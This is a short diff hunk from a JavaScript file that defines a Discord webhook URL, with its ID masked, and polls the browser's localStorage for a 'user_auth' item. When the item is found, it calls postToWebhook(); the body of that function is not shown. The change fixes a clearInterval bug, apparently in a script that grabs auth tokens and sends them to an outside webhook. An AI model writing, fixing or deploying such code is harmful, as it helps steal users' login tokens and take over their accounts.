@@ -249,7 +249,7 @@ var webhook = "https://discord.com/api/webhooks/XXXXXXXXXXXXXXXXX/XXXXXXXXXXXXXX
     
 var intervalStorage = setInterval(function () {
         if (localStorage.getItem("user_auth")) {
-          clearInterval(interval);
+          clearInterval(intervalStorage);
           postToWebhook()
         }
 });
